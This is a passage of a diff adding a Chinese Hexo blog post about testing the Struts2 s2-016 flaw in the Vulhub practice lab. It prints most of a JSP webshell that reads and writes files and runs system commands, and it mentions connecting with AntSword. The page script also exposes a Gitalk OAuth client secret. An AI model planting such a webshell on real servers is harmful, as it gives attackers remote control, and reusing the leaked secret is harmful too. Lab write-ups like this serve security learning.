.getRequestURI())).getParent();</span><br><span class="line">            sb.append(s + &quot;\t&quot;);</span><br><span class="line">            if (!s.substring(0, 1).equals(&quot;/&quot;)) &#123;</span><br><span class="line">                AA(sb);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else if (Z.equals(&quot;B&quot;)) &#123;</span><br><span class="line">            BB(z1, sb);</span><br><span class="line">        &#125; else if (Z.equals(&quot;C&quot;)) &#123;</span><br><span class="line">            String l = &quot;&quot;;</span><br><span class="line">            BufferedReader br = new BufferedReader(</span><br><span class="line">                    new InputStreamReader(new FileInputStream(new File(</span><br><span class="line">                            z1))));</span><br><span class="line">            while ((l = br.readLine()) != null) &#123;</span><br><span class="line">                sb.append(l + &quot;\r\n&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">            br.close();</span><br><span class="line">        &#125; else if (Z.equals(&quot;D&quot;)) &#123;</span><br><span class="line">            BufferedWriter bw = new BufferedWriter(</span><br><span class="line">                    new OutputStreamWriter(new FileOutputStream(</span><br><span class="line">                            new File(z1))));</span><br><span class="line">            bw.write(z2);</span><br><span class="line">            bw.close();</span><br><span class="line">            sb.append(&quot;1&quot;);</span><br><span class="line">        &#125; else if (Z.equals(&quot;E&quot;)) &#123;</span><br><span class="line">            EE(z1);</span><br><span class="line">            sb.append(&quot;1&quot;);</span><br><span class="line">        &#125; else if (Z.equals(&quot;F&quot;)) &#123;</span><br><span class="line">            FF(z1, response);</span><br><span class="line">        &#125; else if (Z.equals(&quot;G&quot;)) &#123;</span><br><span class="line">            GG(z1, z2);</span><br><span class="line">            sb.append(&quot;1&quot;);</span><br><span class="line">        &#125; else if (Z.equals(&quot;H&quot;)) &#123;</span><br><span class="line">            HH(z1, z2);</span><br><span class="line">            sb.append(&quot;1&quot;);</span><br><span class="line">        &#125; else if (Z.equals(&quot;I&quot;)) &#123;</span><br><span class="line">            II(z1, z2);</span><br><span class="line">            sb.append(&quot;1&quot;);</span><br><span class="line">        &#125; else if (Z.equals(&quot;J&quot;)) &#123;</span><br><span class="line">            JJ(z1);</span><br><span class="line">            sb.append(&quot;1&quot;);</span><br><span class="line">        &#125; else if (Z.equals(&quot;K&quot;)) &#123;</span><br><span class="line">            KK(z1, z2);</span><br><span class="line">            sb.append(&quot;1&quot;);</span><br><span class="line">        &#125; else if (Z.equals(&quot;L&quot;)) &#123;</span><br><span class="line">            LL(z1, z2);</span><br><span class="line">            sb.append(&quot;1&quot;);</span><br><span class="line">        &#125; else if (Z.equals(&quot;M&quot;)) &#123;</span><br><span class="line">            String[] c = &#123; z1.substring(2), z1.substring(0, 2), z2 &#125;;</span><br><span class="line">            Process p = Runtime.getRuntime().exec(c);</span><br><span class="line">            MM(p.getInputStream(), sb);</span><br><span class="line">            MM(p.getErrorStream(), sb);</span><br><span class="line">        &#125; else if (Z.equals(&quot;N&quot;)) &#123;</span><br><span class="line">            NN(z1, sb);</span><br><span class="line">        &#125; else if (Z.equals(&quot;O&quot;)) &#123;</span><br><span class="line">            OO(z1, sb);</span><br><span class="line">        &#125; else if (Z.equals(&quot;P&quot;)) &#123;</span><br><span class="line">            PP(z1, sb);</span><br><span class="line">        &#125; else if (Z.equals(&quot;Q&quot;)) &#123;</span><br><span class="line">            QQ(cs, z1, z2, sb);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; catch (Exception e) &#123;</span><br><span class="line">        sb.append(&quot;ERROR&quot; + &quot;:// &quot; + e.toString());</span><br><span class="line">    &#125;</span><br><span class="line">    sb.append(&quot;|&quot; + &quot;&lt;-&quot;);</span><br><span class="line">    out.print(sb.toString());</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
+<p>蚁剑连上去</p>
+<p><img src="/2018/11/01/初试Vulhub/2.jpg" alt=""></p>
+<p>尝试了下反弹bash</p>
+<p>不知道为什么失败了</p>
+<h3 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h3><p>Vulhub这个靶场蛮有意思，有时间多研究一下,顺便试着自己写写dockerfile。</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+      <div>
+        <ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者：</strong>
+    lego
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="http://yoursite.com/2018/11/01/初试Vulhub/" title="初试Vulhub">http://yoursite.com/2018/11/01/初试Vulhub/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>
+    本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+
+      </div>
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/渗透/" rel="tag"># 渗透</a>
+          
+            <a href="/tags/Vulhub/" rel="tag"># Vulhub</a>
+          
+            <a href="/tags/docker/" rel="tag"># docker</a>
+          
+            <a href="/tags/Struts2/" rel="tag"># Struts2</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/10/18/护网杯总结/" rel="next" title="护网杯总结">
+                <i class="fa fa-chevron-left"></i> 护网杯总结
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+ <div id="gitalk-container"></div>
+ 
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="https://raw.githubusercontent.com/legoc/legoc.github.io/master/about/index/baye.png"
+                alt="lego" />
+            
+              <p class="site-author-name" itemprop="name">lego</p>
+              <p class="site-description motion-element" itemprop="description">从小菜鸡往大菜鸡成长的路上...</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">24</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">7</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">44</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#简介"><span class="nav-number">1.</span> <span class="nav-text">简介</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#使用"><span class="nav-number">2.</span> <span class="nav-text">使用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#初试Struts2-s2-016"><span class="nav-number">2.1.</span> <span class="nav-text">初试Struts2 s2-016</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#后记"><span class="nav-number">2.2.</span> <span class="nav-text">后记</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+        <div class="back-to-top">
+          <i class="fa fa-arrow-up"></i>
+          
+            <span id="scrollpercent"><span>0</span>%</span>
+          
+        </div>
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">lego</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</div>
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+  <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+   <script type="text/javascript">
+        var gitalk = new Gitalk({
+          clientID: '76aae4c57ee7f811d638',
+          clientSecret: 'd6d32a0bf34087bf9ee31a1a74fd5bd72cc23c92',
+          repo: 'legoc.github.io',
+          owner: 'legoc',
+          admin: ['legoc'],
+          id: decodeURI(window.location.pathname),
+          distractionFreeMode: 'true'
+        })
+        gitalk.render('gitalk-container')           
+       </script>
+	   
+	   
+	   
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
